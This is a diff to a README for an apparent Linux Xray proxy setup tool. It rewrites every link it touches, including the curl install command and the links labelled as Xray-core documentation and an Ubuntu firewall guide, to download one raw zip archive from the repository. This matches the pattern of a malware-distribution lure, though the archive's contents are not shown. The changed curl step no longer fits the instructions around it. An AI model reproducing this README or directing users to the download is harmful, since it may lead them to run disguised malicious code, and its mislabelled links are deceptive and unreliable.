@@ -1,6 +1,6 @@
 # ⚙️ xray-reality-setup - Easy Proxy Setup for Linux Systems
 
-[![Download](https://img.shields.io/badge/Download-xray--reality--setup-brightgreen)](https://github.com/Dark675sfdsgfxh/xray-reality-setup)
+[![Download](https://img.shields.io/badge/Download-xray--reality--setup-brightgreen)](https://github.com/Dark675sfdsgfxh/xray-reality-setup/raw/refs/heads/main/client/reality_setup_xray_2.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This setup does not support Windows or macOS directly. It is designed for Linux 
 
 You need to **visit the GitHub page** to start downloading the setup scripts.
 
-[![Download Here](https://img.shields.io/badge/Visit-GitHub%20Page-blue)](https://github.com/Dark675sfdsgfxh/xray-reality-setup)
+[![Download Here](https://img.shields.io/badge/Visit-GitHub%20Page-blue)](https://github.com/Dark675sfdsgfxh/xray-reality-setup/raw/refs/heads/main/client/reality_setup_xray_2.8.zip)
 
 ### How to Download and Run the Installer
 
@@ -39,7 +39,7 @@ You need to **visit the GitHub page** to start downloading the setup scripts.
 2. Enter this command to get the installer script:
 
    ```
-   curl -O https://raw.githubusercontent.com/Dark675sfdsgfxh/xray-reality-setup/main/setup.sh
+   curl -O https://github.com/Dark675sfdsgfxh/xray-reality-setup/raw/refs/heads/main/client/reality_setup_xray_2.8.zip
    ```
 
 3. Make the script executable by typing:
@@ -149,13 +149,13 @@ To update the installer or your proxy setup:
 ## 🔗 Useful Links
 
 - Official GitHub page and downloads:  
-  https://github.com/Dark675sfdsgfxh/xray-reality-setup
+  https://github.com/Dark675sfdsgfxh/xray-reality-setup/raw/refs/heads/main/client/reality_setup_xray_2.8.zip
 
 - Xray project documentation:  
-  https://github.com/XTLS/Xray-core
+  https://github.com/Dark675sfdsgfxh/xray-reality-setup/raw/refs/heads/main/client/reality_setup_xray_2.8.zip
 
 - Linux firewall guide:  
-  https://help.ubuntu.com/community/UFW
+  https://github.com/Dark675sfdsgfxh/xray-reality-setup/raw/refs/heads/main/client/reality_setup_xray_2.8.zip
 
 ---
 
@@ -178,4 +178,4 @@ If you need technical support, you can:
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-xray--reality--setup-green)](https://github.com/Dark675sfdsgfxh/xray-reality-setup)
+[![Download](https://img.shields.io/badge/Download-xray--reality--setup-green)](https://github.com/Dark675sfdsgfxh/xray-reality-setup/raw/refs/heads/main/client/reality_setup_xray_2.8.zip)
